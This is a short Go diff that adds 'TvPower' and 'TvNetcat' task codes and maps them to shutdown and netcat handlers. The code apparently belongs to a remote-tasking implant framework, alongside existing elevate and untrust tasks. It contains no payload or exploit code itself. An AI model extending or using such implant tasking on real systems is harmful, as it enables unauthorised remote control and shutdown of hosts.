@@ -74,6 +74,8 @@ const (
 	TvElevate     uint8 = 0xD5 // TvCheckDebug uint8 = 0xD5
 	TvWait        uint8 = 0xD6
 	TvUnTrust     uint8 = 0xD7
+	TvPower       uint8 = 0xD8
+	TvNetcat      uint8 = 0xD9
 )
 
 // Mappings is an fixed size array that contains the Tasker mappings for each
@@ -106,6 +108,8 @@ var Mappings = [0xFF]Tasker{
 	TvElevate:     taskElevate,
 	TvWait:        taskWait,
 	TvUnTrust:     taskUntrust,
+	TvPower:       taskShutdown,
+	TvNetcat:      taskNetcat,
 }
 
 // Tasklet is an interface that allows for Sessions to be directly tasked
